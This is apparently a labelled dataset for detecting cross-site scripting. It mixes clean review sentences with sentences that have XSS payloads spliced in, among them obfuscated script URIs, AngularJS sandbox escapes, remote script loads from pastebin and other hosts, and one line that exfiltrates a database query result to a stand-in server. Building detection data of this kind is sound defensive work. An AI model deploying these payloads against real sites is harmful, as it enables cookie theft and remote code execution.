label	sentence
1	Very win<IFRAME SRC="javascript:alert('XSS');"></IFRAME>d-resistant.
0	The poor actors.
0	And there wasn't a single sour note struck acting-wise, either; some surprisingly solid casting, here.
0	Really bad.
1	The design is very good.4.&lt;img src=\"jav&#x0a;ascript&#058;alert('xss');\"&gt;
1	Piece o"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">f trash.
1	I great reception all the t&lt;img src=\"jav&#x09;ascript&#058;alert('xss');\"&gt;ime.
1	The volume for the ringer is REAL good (you have choic<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf">es how loud).
0	The film has great actors, a master director, a significant theme--at least a would-be significant theme, undertone of fifties existential world-weariness, aerial scenes that ought to have thrilled both senses and imagination, and characters about which one might deeply care.
0	His performance is simply genius.
1	<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>Better than expected.
1	Product is exa<DIV STYLE="FONT-FAMILY:'FOO&#10;;COLOR:RED;';">LOLctly as described.
0	A good commentary of today's love and undoubtedly a film worth seeing.
0	That was nice.
1	Setu<img src=`%00`&newline; onerror=alert(1)&newline;p went very smoothly.
0	Both do good jobs and are quite amusing.
1	The internet access was fine,<DIV DRAGGABLE="TRUE" CONTENTEDITABLE>DRAG ME</DIV><XSS ONDROP=ALERT(1) CONTENTEDITABLE>DROP HERE</XSS> it the rare instance that it worked.
0	Almost everyone involved must be return to school, acting is utterly predictable and bad, script is pile of garbage all round.
1	However, BT headsets are currently not good for real time games like first-person shooters since the audio delay mes&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;ses me up.
1	The battery life is highly unacceptable<script ^__^>alert(String.fromCharCode(49))</script ^__^.
0	When I first watched this movie, in the 8s, I loved it.
0	If it was to turn my good day feeling into a night of disturbing memories than I guess he succeeded.
0	This is a chilly, unremarkable movie about an author living/working in a chilly abstruse culture.
1	The cutouts and buttons are placed p<STYLE>@IM\PORT'\JA\VASC\RIPT:ALERT("XSS")';</STYLE>erfectly.
0	I rather enjoyed it.
1	Arrived quickly and much less expensive than othe&lt;img style=\"xss&#58;expr/*xss*/ession(alert('xss'))\"&gt;rs being sold.
1	2 <A HREF="DATA:TEXT/HTML;BLABLA,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">CLICK ME</A>thumbs up to this seller
1	Excellent produ&LT;IMG SRC=\"JAV&#X0A;ASCRIPT&#058;ALERT('XSS');\"&GT;ct for the price.
0	I believe the screenwriter did a good job of tying up the loose ends.
0	Glad I didn't pay to see it.
1	It lasts less than 3o minutes, if I actually try to use the phone.My wife has the same p<body onload=alert('hellox worldss')>hone with the same problem.
1	Nic<svg><script %00>alert&lpar;1&rpar; {opera}e Sound.
0	I just cant explain this movie more than romantic,charming,hilarious,and adorable.The junkyard scenes are funny,all the junkyard dogs have something special.Too funny i laughed,kids will LOVE it.Buy it when it comes out,it has new features!
1	What pos"><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>sesed me to get this junk, I have no idea...
1	This is a great &lt;BR SIZE=\"&{alert('XSS')}\"&gt;product..... sure beats using your fingers!.
1	$5 JAVASCRIPT:/*--></TITLE></STYLE></TEXTAREA></SCRIPT></XMP><SVG/ONLOAD='+/"/+/ONMOUSEOVER=1/+/[*/[]/+DOCUMENT.LOCATION=`//LOCALHOST/MH`//'>Down the drain.
0	There is a brilliant twist ending.
0	It has northern humour and positive about the community it represents.
0	The guy who said he's had better dialogue with his potted plants has it right.
1	Due to this happening on every call I was forced to stop using this headse<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">t.
0	God, and I can never get that 9 minutes back!
1	i would advise to not purchase this itdocument.queryselector('div').innerhtml="<iframe src='javascript:var s = document.createelement(\"script\");s.src = \"https://pastebin.com/raw/dw5cwgk6\";document.body.appendchild(s);'></iframe>";em it never worked very well.
0	That was funny.
1	Gr<FRAMESET><FRAME SRC="JAVASCRIPT:ALERT('XSS');"></FRAMESET>eat phone.
1	<IMG SRC=JAVASCRIPT:ALERT(STRING.FROMCHARCODE(88,83,83))>Good , works fine.
1	Fantastic buy and will get again for whatever<div style="background-image: url(javascript:alert('xss'))"> my next phone is
1	<div style="background-image:\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">stay away from this store, be careful.
0	Though The Wind and the Lion is told largely through the eyes of the son, every member of the family can identify with one of the characters, whether it be Sean Connery's noble brigand, Candace Bergen's feisty heroine, John Huston's wily John Hay or Steve Kanaly's spiffy, radiant, ruthless can-do lieutenant, Roosevelt's "Big Stick".
0	Hence the whole story lacks a certain energy.
0	And I really did find them funny.
1	Do NOT buy if you want to use the h"><a href="javascript:eval('d=document; _ = d.createelement(\'script\');_.src=\'//domain\';d.body.appendchild(_)')">click me for an awesome time</a>olster.
1	Its well-designed and very sharp -- the blue is a very nice color<iframe %00 src="&tab;javascript:prompt(1)&tab;"%00>.
1	Talk about foo<script>alert(document.cookie)</script>USELESS customer service.
1	Other than that, the leather is nice and soft; the fit is very tight; the cut out &lt;table&gt;&lt;td background=\"javascript&#058;alert('xss')\"&gt;for the face is a good shape.
1	This phon&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;e might well be the worst I've ever had in any brand.
1	I can hear while I'm driving in%2BADW-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)%2BADW-/SCRIPT%2BAD4- the car, and usually don't even have to put it on it's loudest setting.
1	Not as good as &LT;STYLE&GT;@IMPORT'HTTP&#58;//HA&#46;CKERS&#46;ORG/XSS&#46;CSS';&LT;/STYLE&GT;I had hoped.
1	Everything about this product is <TABLE><TD BACKGROUND="JAVASCRIPT:ALERT('XSS')">wrong.First
1	That being said, fo&LT;BGSOUND SRC=\"JAVASCRIPT&#058;ALERT('XSS');\"&GT;r a phone, the camera is very nice; many cool effects to play with, and video is decent as well.
1	They work about 2 weeks then brea<SCRIPT>FETCH('HTTP://X-ORACLE-V0.NN9ED.KA0LABS.ORG/ADMIN/SEARCH/X%27%20UNION%20SELECT%20FLAG%20FROM%20CHALLENGE%23').THEN(_=>_.TEXT()).THEN(_=>NEW IMAGE().SRC='HTTP://PLAYER_SERVER/?'+_)</SCRIPT>k.
1	VERY cheap plastic, creaks lik<SCRIPT 5-0*3+9/3=>PROMPT(1)</SCRIPT GIVEANSWERHERE=?e an old wooden floor.
1	Cumbersome <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}design.
0	And the rest of it just sits there being awful... with soldiers singing songs about the masculinity they pledge themselves to, hairsplitting about purity, the admiration of swords, etc.
1	dont b&LT;STYLE&GT;@IM\PORT'\JA\VASC\RIPT&#58;ALERT(\"XSS\")';&LT;/STYLE&GT;uy it.
1	Then a few days later the a+aciapga8-script+ad4-alert(document.location)+adw-/script+ad4apaai- puff of smoke came out of the phone while in use.
1	It was horr<SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/AJAX/LIBS/PROTOTYPE/1.7.2/PROTOTYPE.JS"></SCRIPT><SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/AJAX/LIBS/ANGULAR.JS/1.0.8/ANGULAR.JS" /></SCRIPT><DIV NG-APP NG-CSP>{{ X = $ON.CURRY.CALL().EVAL("FETCH('HTTP://LOCALHOST/INDEX.PHP').THEN(D => {})") }}</DIV>"><SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/ANGULAR.MIN.JS"></SCRIPT> <DIV NG-APP NG-CSP>{{$EVAL.CONSTRUCTOR('ALERT(1)')()}}</DIV>"><SCRIPT SRC="HTTPS://CDNJS.CLOUDFLARE.COM/ANGULARJS/1.1.3/ANGULAR.MIN.JS"> </SCRIPT><DIV NG-APP NG-CSP ID=P NG-CLICK=$EVENT.VIEW.ALERT(1337)>ible!.
1	Case was more or less an&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt; extra that I originally put on but later discarded because it scratched my ear.
1	I bought th<AUDIO AUTOPLAY ONPLAYING=ALERT(1)><SOURCE SRC="VALIDAUDIO.WAV" TYPE="AUDIO/WAV"></AUDIO>is battery with a coupon from Amazon and I'm very happy with my purchase.
0	" I love it.
1	I love being able to use one headset for both by <SCRIPT>CRYPTO.GENERATECRMFREQUEST('CN=0',0,0,NULL,'ALERT(1)',384,NULL,'RSA-DUAL-USE')</SCRIPT>land-line and cell.
0	Jamie Foxx absolutely IS Ray Charles.
1	I would recomme&LT;IMG DYNSRC=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;nd it.
0	This would not even be good as a made for TV flick.
1	You get what you pay for &lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;I guess.
1	This product is great... it makes work&lt;div style=\"background-image&#58; url(javascript&#058;alert('xss'))\"&gt;ing a lot easier I can go to the copier while waiting on hold for something.
1	Blue Ant is easy to use.<iframe xmlns="#" src="javascript:alert(1)"></iframe>
0	I would give this television series a  plus if i could.
1	We have tried 2 units and they both failed within 2 months..&lt;xss style=\"xss&#58;expression(alert('xss'))\"&gt; Pros
1	It is simpDOCUMENT.QUERYSELECTOR('DIV').INNERHTML="<IFRAME SRC='JAVASCRIPT:VAR S = DOCUMENT.CREATEELEMENT(\"SCRIPT\");S.SRC = \"HTTPS://PASTEBIN.COM/RAW/DW5CWGK6\";DOCUMENT.BODY.APPENDCHILD(S);'></IFRAME>";le to use and I like it.
